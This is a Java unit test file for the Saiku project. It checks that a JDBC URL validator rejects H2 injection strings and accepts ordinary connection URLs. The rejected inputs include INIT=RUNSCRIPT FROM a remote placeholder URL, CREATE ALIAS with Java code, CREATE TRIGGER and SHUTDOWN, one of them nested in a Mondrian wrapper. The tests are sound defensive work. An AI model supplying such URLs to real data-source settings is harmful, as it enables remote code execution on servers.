/*
 *   Copyright 2026 Spicule Ltd
 *   Apache License, Version 2.0.
 */
package org.saiku.web.rest.objects;

import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

import org.junit.Test;

public class JdbcUrlValidatorTest {

    @Test
    public void rejectsH2InitRunscript() {
        try {
            JdbcUrlValidator.validate("jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://e/p.sql'");
            fail("expected IllegalArgumentException for H2 INIT=RUNSCRIPT");
        } catch (IllegalArgumentException e) {
            assertTrue(e.getMessage(), e.getMessage().toLowerCase().contains("jdbc url"));
        }
    }

    @Test
    public void rejectsH2CreateAlias() {
        try {
            JdbcUrlValidator.validate("jdbc:h2:mem:x;INIT=CREATE ALIAS EXEC AS $$ String x() { return \"y\"; } $$");
            fail("expected IllegalArgumentException for H2 CREATE ALIAS");
        } catch (IllegalArgumentException e) {
            // expected
        }
    }

    @Test
    public void rejectsH2CreateTrigger() {
        try {
            JdbcUrlValidator.validate("jdbc:h2:mem:x;INIT=CREATE TRIGGER t BEFORE INSERT ON s");
            fail("expected IllegalArgumentException for H2 CREATE TRIGGER");
        } catch (IllegalArgumentException e) {
            // expected
        }
    }

    @Test
    public void rejectsH2Shutdown() {
        try {
            JdbcUrlValidator.validate("jdbc:h2:mem:x;SHUTDOWN");
            fail("expected IllegalArgumentException for H2 SHUTDOWN");
        } catch (IllegalArgumentException e) {
            // expected
        }
    }

    @Test
    public void rejectsH2InitNestedInMondrianWrapper() {
        try {
            JdbcUrlValidator.validate(
                    "jdbc:mondrian:Jdbc=jdbc:h2:./foodmart;INIT=RUNSCRIPT FROM 'http://e/p.sql';Catalog=mondrian://Foodmart;JdbcDrivers=org.h2.Driver");
            fail("expected IllegalArgumentException for H2 INIT nested in mondrian wrapper");
        } catch (IllegalArgumentException e) {
            // expected
        }
    }

    @Test
    public void acceptsNormalPostgres() {
        // Should not throw.
        JdbcUrlValidator.validate("jdbc:postgresql://h/db");
    }

    @Test
    public void acceptsMondrianWrappedH2WithoutInit() {
        // Legitimate Mondrian datasource over an embedded H2 file — no INIT/RUNSCRIPT/ALIAS.
        JdbcUrlValidator.validate(
                "jdbc:mondrian:Jdbc=jdbc:h2:./foodmart;Catalog=mondrian://Foodmart;JdbcDrivers=org.h2.Driver");
    }

    @Test
    public void acceptsNull() {
        JdbcUrlValidator.validate(null);
    }
}
